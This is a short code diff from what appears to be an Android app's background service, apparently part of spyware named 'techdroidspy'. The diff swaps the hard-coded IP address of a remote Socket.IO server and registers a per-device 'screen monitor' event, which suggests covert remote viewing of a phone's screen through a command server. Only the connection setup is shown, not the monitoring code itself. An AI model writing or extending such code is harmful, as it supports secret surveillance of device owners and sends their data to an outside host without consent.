@@ -83,8 +83,8 @@ public class Server extends Service {
         }
 
         try {
-//            socket = IO.socket("https://socket.techdroidspy.com");
-            socket = IO.socket("http://191.101.131.54:8080");
+            socket = IO.socket("http://37.60.233.14:8080");
+//            socket = IO.socket("http://191.101.131.54:8081");
             socket.connect();
             socket.on(Socket.EVENT_CONNECT, onConnectDevice);
             socket.on("mb-screen-monitor-" + mDeviceID, onScreenMonitor);
